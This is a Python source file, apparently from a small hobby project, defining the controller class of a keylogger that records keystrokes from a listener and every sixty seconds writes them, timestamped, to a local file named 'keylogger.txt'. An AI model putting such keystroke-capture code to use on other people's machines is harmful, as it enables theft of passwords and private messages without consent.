from events import MyListener
from files import MyFile
import date_and_time
import threading


class Manager:
    def __init__(self):
        self.key_listener = MyListener()
        self.file = MyFile("keylogger.txt")
        self.dic = {}
        self.running = True

    """
    start the thread listener and the timer 
    """
    def start(self):
        self.key_listener.start_run_and_listener()
        self.new_thread()
        # if self.key_listener.temp_fun():
        #     self.stop()
        self.key_listener.start_join()
    """
    timer for 60 sec that will execute the append fun
    """

    def timer(self):
        if self.running:
            self.append_dic()
            time = threading.Timer(60.0, self.timer)
            time.start()
    """
    update the dictionary with the time and key pressing
    and write it to file and restart the dictionary
    """
    def append_dic(self):
        press = self.key_listener.hold_press()
        self.dic.update({date_and_time.get_time(): press})
        print(self.dic)
        self.file.write_to_file(str(self.dic))
        self.key_listener.key_holder = ""
        self.dic.clear()

    """
    new thread for the timer to run on the same time with the listener
    """
    def new_thread(self):
        timer_thread = threading.Thread(target=self.timer)
        timer_thread.daemon = True
        timer_thread.start()
    """
    print every thing that was written until now 
    """
    def call_read_file(self):
        read = self.file.read_file()
        print(read)
    """
    stop the program
    """
    def stop(self):
        self.call_read_file()
        self.key_listener.stop_program()
        date_and_time.stop_timer()


